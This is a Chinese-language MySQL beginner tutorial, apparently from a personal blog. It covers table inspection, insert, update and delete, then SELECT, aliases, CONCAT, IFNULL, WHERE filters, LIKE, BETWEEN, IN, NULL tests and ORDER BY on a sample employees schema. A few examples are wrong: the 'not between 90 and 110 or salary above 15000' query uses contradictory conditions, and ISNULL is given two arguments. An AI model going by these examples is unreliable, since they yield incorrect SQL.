<h5 id="查看表的结构"><a href="#查看表的结构" class="headerlink" title="查看表的结构"></a>查看表的结构</h5><h5 id="desc-表名"><a href="#desc-表名" class="headerlink" title="desc 表名;"></a>desc 表名;</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#用desc产看了handsome表的结构</span><br><span class="line">mysql&gt; desc handsome;</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field | Type        | Null | Key | Default | Extra |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| id    | int(11)     | YES  |     | NULL    |       |</span><br><span class="line">| name  | varchar(20) | YES  |     | NULL    |       |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<h5 id="查看当前表的数据"><a href="#查看当前表的数据" class="headerlink" title="查看当前表的数据"></a>查看当前表的数据</h5><h5 id="select-from-表名"><a href="#select-from-表名" class="headerlink" title="select * from 表名;"></a>select * from 表名;</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 当前handsome表里并没有数据 </span><br><span class="line">mysql&gt; select * from handsome;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="向表中插入数据"><a href="#向表中插入数据" class="headerlink" title="向表中插入数据"></a>向表中插入数据</h5><h5 id="insert-into-表名-values-插入内容"><a href="#insert-into-表名-values-插入内容" class="headerlink" title="insert into 表名() values (插入内容);"></a>insert into 表名() values (插入内容);</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line">mysql&gt; insert into handsome (id,name) values(1,&#39;john&#39;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into handsome (id,name) values(2,&#39;rose&#39;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"># 用 select * from handsome;查看当前表的内容</span><br><span class="line">mysql&gt; select * from handsome;</span><br><span class="line">+------+------+</span><br><span class="line">| id   | name |</span><br><span class="line">+------+------+</span><br><span class="line">|    1 | john |</span><br><span class="line">|    2 | rose |</span><br><span class="line">+------+------+</span><br></pre></td></tr></table></figure>

<h5 id="修改表中内容"><a href="#修改表中内容" class="headerlink" title="修改表中内容"></a>修改表中内容</h5><h5 id="update-表名-set-字段-’更改内容’-where-列名-序号"><a href="#update-表名-set-字段-’更改内容’-where-列名-序号" class="headerlink" title="update 表名 set 字段=’更改内容’ where 列名=序号;"></a>update 表名 set 字段=’更改内容’ where 列名=序号;</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update handsome set name&#x3D;&#39;MySQL&#39; where id&#x3D;1;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line"># 用select *form handsome;查看handsome表中的内容</span><br><span class="line">mysql&gt; select * from handsome;</span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">|    1 | MySQL |</span><br><span class="line">|    2 | rose  |</span><br><span class="line">+------+-------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="删除表中内容"><a href="#删除表中内容" class="headerlink" title="删除表中内容"></a>删除表中内容</h5><h5 id="delete-from-表名-where-列名-序列号"><a href="#delete-from-表名-where-列名-序列号" class="headerlink" title="delete from 表名 where 列名=序列号;"></a>delete from 表名 where 列名=序列号;</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#删除handsome表中的id列中的1序列号内容，</span><br><span class="line">mysql&gt; delete from handsome where id&#x3D;1;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from handsome;</span><br><span class="line">+------+------+</span><br><span class="line">| id   | name |</span><br><span class="line">+------+------+</span><br><span class="line">|    2 | rose |</span><br><span class="line">+------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="查看MySQL当前版本"><a href="#查看MySQL当前版本" class="headerlink" title="查看MySQL当前版本"></a>查看MySQL当前版本</h5><h5 id="1、select-version"><a href="#1、select-version" class="headerlink" title="1、select version();"></a>1、select version();</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#第一种方法，用select version();查看当前版本，version是版本的意思，说明当前版本是5.5</span><br><span class="line">#第一种方法实在MySQL客户端上查看</span><br><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="2、mysql-version-简写形式：mysql-V"><a href="#2、mysql-version-简写形式：mysql-V" class="headerlink" title="2、mysql -version    简写形式：mysql -V"></a>2、mysql -version    简写形式：mysql -V</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#退出mysql后，再当前命令行用mysql --version查看版本，版本还是5.5</span><br><span class="line">D:\phpStudy\PHPTutorial\MySQL\bin&gt;mysql --version</span><br><span class="line">mysql  Ver 14.14 Distrib 5.5.53, for Win32 (AMD64)</span><br><span class="line"></span><br><span class="line">D:\phpStudy\PHPTutorial\MySQL\bin&gt;mysql -V</span><br><span class="line">mysql  Ver 14.14 Distrib 5.5.53, for Win32 (AMD64)</span><br></pre></td></tr></table></figure>

<h4 id="MySQL的语法规范"><a href="#MySQL的语法规范" class="headerlink" title="MySQL的语法规范"></a>MySQL的语法规范</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、不区分大小写，建议关键字大写，表名、列名小写</span><br><span class="line">2、每条命令最好用分号结尾</span><br><span class="line">3、每条命令根据需要，可以进行缩进 或 换行(命令过长时，可以使用换行，如果换行，建议关键字单独一行)</span><br><span class="line">4、注释</span><br><span class="line">	单行注释:#注释文字</span><br><span class="line">	单行注释:-- 注释文字(注意，--后有空格)</span><br><span class="line">	多行注释:&#x2F;* 注释文字 *&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="myemployees库四张表介绍"><a href="#myemployees库四张表介绍" class="headerlink" title="myemployees库四张表介绍"></a>myemployees库四张表介绍</h3><h4 id="employees表-员工表"><a href="#employees表-员工表" class="headerlink" title="employees表 | 员工表"></a>employees表 | 员工表</h4><table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>employee_id  int(6)</td>
<td>员工编号</td>
</tr>
<tr>
<td>first_name，varchar(20)</td>
<td>名</td>
</tr>
<tr>
<td>last_name， varchar(25)</td>
<td>姓（姓名）</td>
</tr>
<tr>
<td>email，varchar(25)</td>
<td>邮箱</td>
</tr>
<tr>
<td>phone_number， varchar(20)</td>
<td>电话号码</td>
</tr>
<tr>
<td>job_id， varchar(10)</td>
<td>工种编号</td>
</tr>
<tr>
<td>salary， double(10,2)</td>
<td>月薪</td>
</tr>
<tr>
<td>commission_pct， double(4,2)</td>
<td>奖金率</td>
</tr>
<tr>
<td>manager_id， int(6)</td>
<td>上级领导的员工编号</td>
</tr>
<tr>
<td>department_id， int(4)</td>
<td>部门编号</td>
</tr>
<tr>
<td>hiredate， datetime</td>
<td>入职时间</td>
</tr>
</tbody></table>
<h4 id="departments表-部门表"><a href="#departments表-部门表" class="headerlink" title="departments表 | 部门表"></a>departments表 | 部门表</h4><table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>department_id</td>
<td>部门编号</td>
</tr>
<tr>
<td>department_name</td>
<td>部门名称</td>
</tr>
<tr>
<td>manager_id</td>
<td>部门领导的员工编号</td>
</tr>
<tr>
<td>location_id</td>
<td>位置编号</td>
</tr>
</tbody></table>
<h4 id="locations表-位置表"><a href="#locations表-位置表" class="headerlink" title="locations表 | 位置表"></a>locations表 | 位置表</h4><table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>location_id</td>
<td>位置编号</td>
</tr>
<tr>
<td>street_address</td>
<td>街道地址</td>
</tr>
<tr>
<td>postal_code</td>
<td>邮编地址</td>
</tr>
<tr>
<td>city</td>
<td>城市</td>
</tr>
<tr>
<td>state_province</td>
<td>省</td>
</tr>
<tr>
<td>country_id</td>
<td>国家编号</td>
</tr>
</tbody></table>
<h4 id="jobs表-职位"><a href="#jobs表-职位" class="headerlink" title="jobs表 | 职位"></a>jobs表 | 职位</h4><table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>job_id</td>
<td>职位编号</td>
</tr>
<tr>
<td>job_title</td>
<td>职位名称</td>
</tr>
<tr>
<td>min_salary</td>
<td>最低工资</td>
</tr>
<tr>
<td>max_salary</td>
<td>最高工资</td>
</tr>
</tbody></table>
<h3 id="DQL语言"><a href="#DQL语言" class="headerlink" title="DQL语言"></a>DQL语言</h3><h4 id="基础查询（重点）"><a href="#基础查询（重点）" class="headerlink" title="基础查询（重点）"></a>基础查询（重点）</h4><h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><p>​    select  查询列表  from 表名;    </p>
<h5 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h5><h5 id="1、查询列表可以是：表中的字段，常量值、表达式、函数"><a href="#1、查询列表可以是：表中的字段，常量值、表达式、函数" class="headerlink" title="1、查询列表可以是：表中的字段，常量值、表达式、函数"></a>1、查询列表可以是：表中的字段，常量值、表达式、函数</h5><h5 id="2、查询的结果是一个虚拟的表格"><a href="#2、查询的结果是一个虚拟的表格" class="headerlink" title="2、查询的结果是一个虚拟的表格"></a>2、查询的结果是一个虚拟的表格</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">着重号&#96; &#96;位置在数字一旁边,用于区分 &#39;关键字&#39;和&#39;字段&#39;的</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、查询表中的单个字段</span><br><span class="line">#last_name是employees表中的字段，如果不加FROM employees会出错</span><br><span class="line">mysql&gt; SELECT last_name FROM employees;</span><br><span class="line"></span><br><span class="line">2、查询表中的多个字段</span><br><span class="line">#查询多个字段每个字段中间用&#39;,&#39;逗号隔开</span><br><span class="line">mysql&gt; SELECT last_name,salary,email FROM employees;</span><br><span class="line"></span><br><span class="line">3、查询表中所有字段</span><br><span class="line">#查询employees所有字段</span><br><span class="line">mysql&gt; SELECT * FROM employees;</span><br><span class="line">还有一种方法，像第二步一样，将所有字段都打上，然后查询。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4、查询常量值</span><br><span class="line">#100只是一个普通的常量值，并不是来自某个表所以不需要加FROM</span><br><span class="line">mysql&gt; SELECT 100;	#还会返回结果，只不过它显示的字段名就是它本身</span><br><span class="line">+-----+</span><br><span class="line">| 100 |</span><br><span class="line">+-----+</span><br><span class="line">| 100 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line">查询字符型常量值</span><br><span class="line"></span><br><span class="line"># MySQL中是不区分字符和字符串的，只要是字符都认为是字符型</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT &#39;jock&#39;;</span><br><span class="line">+------+</span><br><span class="line">| jock |</span><br><span class="line">+------+</span><br><span class="line">| jock |</span><br><span class="line">+------+</span><br><span class="line">注意:字符型和日期型的常量值必须用引号引起来，数值型不需要</span><br><span class="line"></span><br><span class="line">5、查询表达式</span><br><span class="line"></span><br><span class="line"># 用SELECT 计算表达式也是可以的(+、-、*、&#x2F;、%...)算数运算符都可以用</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT 100*98;</span><br><span class="line">+--------+</span><br><span class="line">| 100*98 |</span><br><span class="line">+--------+</span><br><span class="line">|   9800 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">6、查询函数</span><br><span class="line"># 函数最关键的标志就是&#39;()&#39;小括号，之前的VERSION()就是一个函数</span><br><span class="line"># 查看版本号</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT VERSION();</span><br><span class="line">+-----------+</span><br><span class="line">| VERSION() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">7、为字段起别名</span><br><span class="line">优点：</span><br><span class="line">	便于理解，提高可读性</span><br><span class="line">	如果要查询的字段有重名情况，使用别名可以区分。</span><br><span class="line"></span><br><span class="line">方式一：使用AS</span><br><span class="line">#格式 SELECT 内容(列表) AS 名称(别名)</span><br><span class="line">mysql&gt; SELECT 100%98 AS 结果;</span><br><span class="line">+------+</span><br><span class="line">| 结果     |</span><br><span class="line">+------+</span><br><span class="line">|    2 |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"># 将employees数据库中的last_name 和 first_name 分别起名 &#39;姓&#39;和&#39;名&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT last_name AS 姓,first_name AS 名 FROM employees;</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| 姓            | 名            |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| K_ing       | Steven      |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方式二：使用空格，不需要使用AS</span><br><span class="line">mysql&gt; SELECT last_name 姓,first_name 名 FROM employees;</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| 姓            | 名            |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| K_ing       | Steven      |</span><br><span class="line"></span><br><span class="line">特殊情况</span><br><span class="line">	案例：给last_name起一个别名out put</span><br><span class="line">	#如果这样运行会报错，因为中间有特殊符号 &#39;空格&#39;，MySQL不理解当前内容</span><br><span class="line">	mysql&gt; SELECT last_name AS out put from employees;</span><br><span class="line">	修改：</span><br><span class="line">	#将有特殊符号的别名用(&quot;&quot;)双引号引起来，当然，这里着重号(&#39;&#39;)也是可以的。</span><br><span class="line">	mysql&gt; SELECT last_name AS &quot;out put&quot; from employees;</span><br><span class="line">	</span><br><span class="line">8、去重 distinct</span><br><span class="line">语法：</span><br><span class="line">	SELECT DISTINCT 字段名 FROM 表名;</span><br><span class="line"></span><br><span class="line">案例：查询员工表中涉及到的所有部门编号</span><br><span class="line"># 其中有很多重复的编号</span><br><span class="line">mysql&gt; SELECT department_id FROM employees;</span><br><span class="line">+---------------+</span><br><span class="line">| department_id |</span><br><span class="line">+---------------+</span><br><span class="line">|          NULL |</span><br><span class="line">|            10 |</span><br><span class="line">|            20 |</span><br><span class="line">|            20 |</span><br><span class="line">|            30 |</span><br><span class="line">|            30 |</span><br><span class="line"></span><br><span class="line"># 这样就将重复的数字去除了</span><br><span class="line">mysql&gt; select distinct department_id from employees;</span><br><span class="line">+---------------+</span><br><span class="line">| department_id |</span><br><span class="line">+---------------+</span><br><span class="line">|          NULL |</span><br><span class="line">|            10 |</span><br><span class="line">|            20 |</span><br><span class="line">|            30 |</span><br><span class="line">|            40 |</span><br><span class="line">注意:去重不能用于多个字段，只能用于单字段</span><br><span class="line"></span><br><span class="line">9、+号的作用</span><br><span class="line">在其他编程语言中+号是运算符，也是拼接符，</span><br><span class="line">而在MySQL中+号：</span><br><span class="line">		只有一个功能:运算符</span><br><span class="line">select 100+90; 	  两个操作数都是数值时，则做加法运算</span><br><span class="line">select &#39;123&#39;+90;  只要其中一方为字符型，试图将字符型转换成数值型</span><br><span class="line">				  如果转换成功，则继续做加法运算</span><br><span class="line">select &#39;john&#39;+90; 如果转换失败，则将字符型数值转换成0</span><br><span class="line">select null+90;   只要其中一方为null，则结果肯定为null</span><br><span class="line"></span><br><span class="line">案例：查询员工名和姓连接成一个字段，并显示为 姓名</span><br><span class="line">#虽然没报错，但是输出结果全是0，原因是+号和我们想象的不一样，这里并不是拼接的意思</span><br><span class="line">	mysql&gt; SELECT last_name+first_name AS 姓名 FROM employees;</span><br><span class="line">+------+</span><br><span class="line">| 姓名     |</span><br><span class="line">+------+</span><br><span class="line">|    0 |	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">【补充】concat函数</span><br><span class="line">在MySQL中做拼接就不能用+号了而是用到一个函数CONCAT函数</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT CONCAT(last_name,first_name) AS 姓名 FROM employees;</span><br><span class="line">+------------------+</span><br><span class="line">| 姓名                 |</span><br><span class="line">+------------------+</span><br><span class="line">| K_ingSteven      |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">【补充】ifnull函数</span><br><span class="line"></span><br><span class="line">IFNULL()函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回指定的值，如果不为 NULL 则返回原来的的值</span><br><span class="line"># 用IFNULL判断时候为null，结果为null返回0，不为null返回本身</span><br><span class="line">mysql&gt; SELECT CONCAT(first_name,&#39;,&#39;,last_name,&#39;,&#39;,IFNULL(commission_pct,0)) AS out_put FROM employees;</span><br><span class="line">+------------------------+</span><br><span class="line">| out_put                |</span><br><span class="line">+------------------------+</span><br><span class="line">| Steven,K_ing,0.00      |</span><br><span class="line">| Neena,Kochhar,0.00     |</span><br><span class="line">| John,Russell,0.40      |</span><br><span class="line"></span><br><span class="line">【补充】isnull函数</span><br><span class="line">判断某字段表达式是否为null，如果是，则返回1，否则返回0</span><br><span class="line">SELECT CONCAT(first_name,&#39;,&#39;,last_name,&#39;,&#39;,ISNULL(commission_pct,0)) AS out_put FROM employees;</span><br></pre></td></tr></table></figure>

<h4 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&gt;和!&#x3D;都是不等于的意思</span><br><span class="line">语法：</span><br><span class="line">	SELECT 查询列表 FROM 表名	WHERE 筛选条件;  #这里的where可以理解为if的意思</span><br><span class="line">	</span><br><span class="line">分类:</span><br><span class="line">	一、按条件表达式筛选(条件运算符):&gt;、&lt;、&#x3D;、&lt;&gt;(!&#x3D;)、&gt;&#x3D;、&lt;&#x3D;  #其中&lt;&gt;表示不等于，也可以用!&#x3D; </span><br><span class="line">	二、按逻辑表达式筛选(逻辑运算符):and、or、not</span><br><span class="line">	三、模糊查询:like、between and、in、is null</span><br></pre></td></tr></table></figure>

<h5 id="1、按条件表达式筛选"><a href="#1、按条件表达式筛选" class="headerlink" title="1、按条件表达式筛选"></a>1、按条件表达式筛选</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例一:查询工资&gt;12000的员工信息</span><br><span class="line">mysql&gt; SELECT * FROM employees WHERE salary&gt;12000;</span><br><span class="line">  案例二:查询部门编号不等于90号的员工名和部门编号</span><br><span class="line">mysql&gt; SELECT last_name,department_id FROM employees WHERE department_id&lt;&gt;90;</span><br></pre></td></tr></table></figure>

<h5 id="2、按逻辑表达式筛选"><a href="#2、按逻辑表达式筛选" class="headerlink" title="2、按逻辑表达式筛选"></a>2、按逻辑表达式筛选</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例一:查询工资在1w到2w之间的员工名、工资、以及奖金</span><br><span class="line">mysql&gt; SELECT</span><br><span class="line">    -&gt; last_name,salary,commission_pct</span><br><span class="line">    -&gt; FROM</span><br><span class="line">    -&gt; employees</span><br><span class="line">    -&gt; WHERE</span><br><span class="line">    -&gt; salary&gt;&#x3D;10000 AND salary&lt;&#x3D;20000;</span><br><span class="line">    </span><br><span class="line">案例一:查询部门编号不是在90到110之间，或者工资高于15000的员工信息</span><br><span class="line"> SELECT</span><br><span class="line">    -&gt; department_id,salary</span><br><span class="line">    -&gt; FROM</span><br><span class="line">    -&gt; employees</span><br><span class="line">    -&gt; WHERE</span><br><span class="line">    -&gt; department_id&lt;90 AND department_id&gt;110 OR salary&lt;15000;</span><br><span class="line">   	#还有一种是</span><br><span class="line">    -&gt; NOT(department_id&gt;&#x3D;90 AND department_id&lt;&#x3D;110) OR salary&lt;15000;</span><br></pre></td></tr></table></figure>

<h4 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h4><h5 id="一、like"><a href="#一、like" class="headerlink" title="一、like"></a>一、like</h5><h5 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h5><ul>
<li><h5 id="一般和通配符搭配使用"><a href="#一般和通配符搭配使用" class="headerlink" title="一般和通配符搭配使用"></a>一般和通配符搭配使用</h5></li>
<li><h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符:"></a>通配符:</h5><ul>
<li><h5 id="任意多个字符，包含0个字符"><a href="#任意多个字符，包含0个字符" class="headerlink" title="% 任意多个字符，包含0个字符"></a>% 任意多个字符，包含0个字符</h5></li>
<li><h5 id="任意单个字符"><a href="#任意单个字符" class="headerlink" title="_ 任意单个字符"></a>_ 任意单个字符</h5></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">		</span><br><span class="line">案例一:查询员工名中包含字符a的员工信息</span><br><span class="line">#a是字符用引号引起，%代表通配符</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM employees WHERE last_name like &#39;%a%&#39;;</span><br><span class="line"></span><br><span class="line">案例二:查询员工名中第三个字符为n，第五个字符为l的员工名和工资</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT salary,last_name FROM employees WHERE last_name LIKE &#39;__n_l%&#39;;</span><br><span class="line">+---------+-----------+</span><br><span class="line">| salary  | last_name |</span><br><span class="line">+---------+-----------+</span><br><span class="line">| 9000.00 | Hunold    |</span><br><span class="line">+---------+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">案例三:查询员工名中第二个字符为下划线的 </span><br><span class="line">#可以用反斜杠转义</span><br><span class="line">mysql&gt; SELECT last_name FROM employees WHERE last_name LIKE &#39;_\_%&#39;;</span><br><span class="line">+-----------+</span><br><span class="line">| last_name |</span><br><span class="line">+-----------+</span><br><span class="line">| K_ing     |</span><br><span class="line">| K_ing     |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">escape方法</span><br><span class="line">#可以不用反斜杠使用任意字符，然后再后面加一个 ESCAPE关键字，将之前的字符引起来就可以</span><br><span class="line">mysql&gt; SELECT last_name FROM employees WHERE last_name LIKE &#39;_^_%&#39; ESCAPE &#39;^&#39;;</span><br></pre></td></tr></table></figure>

<h5 id="二、between-and"><a href="#二、between-and" class="headerlink" title="二、between and"></a>二、between and</h5><p>1、使用between and 可以提高语句的简洁度</p>
<p>2、包含临界值</p>
<p>3、两个临界值不能调换顺序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例1:查询员工编号100到120之间的员工信息</span><br><span class="line">#这样就不需要像之前用and一样，每个数值前都需要加上字段名</span><br><span class="line">现在:mysql&gt; SELECT employee_id FROM employees WHERE employee_id BETWEEN 100 AND 120;</span><br><span class="line"></span><br><span class="line">#之前:mysql&gt; SELECT employee_id FROM employees WHERE employee_id&gt;&#x3D;100 AND employee_id&lt;&#x3D;120;</span><br><span class="line"></span><br><span class="line">not between and</span><br><span class="line">mysql&gt; SELECT last_name,salary FROM employees WHERE salary NOT BETWEEN 8000 and 17000</span><br></pre></td></tr></table></figure>

<h5 id="三、in"><a href="#三、in" class="headerlink" title="三、in"></a>三、in</h5><h5 id="含义-判断某一字段的值是否属于in列表中的某一项，只要满足其中一项就可以，类似于or"><a href="#含义-判断某一字段的值是否属于in列表中的某一项，只要满足其中一项就可以，类似于or" class="headerlink" title="含义:判断某一字段的值是否属于in列表中的某一项，只要满足其中一项就可以，类似于or"></a>含义:判断某一字段的值是否属于in列表中的某一项，只要满足其中一项就可以，类似于or</h5><h5 id="特点-1"><a href="#特点-1" class="headerlink" title="特点:"></a>特点:</h5><h5 id="1、使用in提高了语句的简洁度"><a href="#1、使用in提高了语句的简洁度" class="headerlink" title="1、使用in提高了语句的简洁度"></a>1、使用in提高了语句的简洁度</h5><h5 id="2、in列表的值类型必须统一或者兼容"><a href="#2、in列表的值类型必须统一或者兼容" class="headerlink" title="2、in列表的值类型必须统一或者兼容"></a>2、in列表的值类型必须统一或者兼容</h5><h5 id="3、in列表不支持通配符"><a href="#3、in列表不支持通配符" class="headerlink" title="3、in列表不支持通配符"></a>3、in列表不支持通配符</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例:查询员工的工种编号是 IT_PROG、AD_VP中的一个员工名和工种编号</span><br><span class="line">现在:mysql&gt; SELECT last_name,job_id FROM employees WHERE job_id IN (&#39;IT_PROG&#39;,&#39;AD_VP&#39;);</span><br><span class="line"></span><br><span class="line">之前:mysql&gt; SELECT last_name,job_id FROM employees WHERE job_id&#x3D;&#39;IT_PROG&#39; OR job_id&#x3D;&#39;AD_VP&#39;;</span><br></pre></td></tr></table></figure>

<h5 id="四、is-null"><a href="#四、is-null" class="headerlink" title="四、is null"></a>四、is null</h5><h5 id="或者-lt-gt-不能用于判断null值"><a href="#或者-lt-gt-不能用于判断null值" class="headerlink" title="= 或者 &lt;&gt; 不能用于判断null值"></a>= 或者 &lt;&gt; 不能用于判断null值</h5><h5 id="is-null-或-is-not-null-可以判断null值"><a href="#is-null-或-is-not-null-可以判断null值" class="headerlink" title="is null 或 is not null 可以判断null值"></a>is null 或 is not null 可以判断null值</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例一:查询没有奖金的员工名和奖金率</span><br><span class="line">mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct IS NULL;</span><br><span class="line">查询有奖金的:</span><br><span class="line">mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct IS NOT NULL;</span><br></pre></td></tr></table></figure>

<h5 id="安全等于-lt-gt"><a href="#安全等于-lt-gt" class="headerlink" title="安全等于    &lt;=&gt;"></a>安全等于    &lt;=&gt;</h5><p>是判断是否等于，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例一:查询没有奖金的员工名和奖金率</span><br><span class="line">mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct &lt;&#x3D;&gt; NULL;</span><br><span class="line"></span><br><span class="line">案例二:查询工资12000的员工信息</span><br><span class="line">mysql&gt; SELECT last_name,salary FROM employees WHERE salary &lt;&#x3D;&gt; 12000;</span><br></pre></td></tr></table></figure>

<h4 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">提点:</span><br><span class="line">	1、ASC是升序 DESC是降序，如果不写，默认是升序</span><br><span class="line">	2、order by子句中可以支持单个字段、多个字段、表达式、函数、别名</span><br><span class="line">	3、order by子句一般是放在查询语句的最后面，limit语句除外</span><br><span class="line">	</span><br><span class="line">语法一:</span><br><span class="line">	SELECT 查询列表 FROM 表 【WHERE 筛选条件】 ORDER BY 排序列表  |【ASC | DESC】</span><br><span class="line"></span><br><span class="line">案例:查询员工信息，要求工资从高到低排序  | 从低到高只需要把DESC修改成ASC就可以</span><br><span class="line">mysql&gt; SELECT * FROM employees WHERE salary ORDER BY salary DESC;</span><br><span class="line"></span><br><span class="line">案例二:查询部门编号&gt;&#x3D;90的员工信息,按入职时间的先后进行排序【添加筛选条件】</span><br><span class="line">mysql&gt; SELECT department_id,hiredate FROM employees WHERE department_id&gt;&#x3D;90 ORDER BY hiredate ASC;</span><br><span class="line"></span><br><span class="line">案例三:按年薪的高低显示员工的信息和年薪【按表达式排序】</span><br><span class="line">mysql&gt; SELECT *,salary*12*(1+IFNULL(commission_pct,0)) 年薪</span><br><span class="line">    -&gt; FROM employees</span><br><span class="line">    -&gt; ORDER BY salary*12*(1+IFNULL(commission_pct,0)) DESC;</span><br><span class="line">    </span><br><span class="line">案例四:按年薪的高低显示员工的信息和年薪【按别名排序】</span><br><span class="line">mysql&gt; SELECT *,salary*12*(1+IFNULL(commission_pct,0)) 年薪</span><br><span class="line">    -&gt; FROM employees</span><br><span class="line">    -&gt; ORDER BY 年薪 DESC;</span><br><span class="line">   </span><br><span class="line">案例五:按姓名的长度显示员工的姓名和工资【按函数排序】</span><br><span class="line">lenth()函数可以显示字符长度</span><br><span class="line">mysql&gt; SELECT LENGTH(last_name) 字节长度,last_name,salary FROM employees ORDER BY LENGTH(last_name);</span><br><span class="line"></span><br><span class="line">案例六:查询员工信息，要求先按照员工工资排序，再按员工编号排序【按多个字段排序】</span><br><span class="line">mysql&gt; SELECT * FROM employees ORDER BY salary ASC,employee_id DESC;</span><br></pre></td></tr></table></figure>

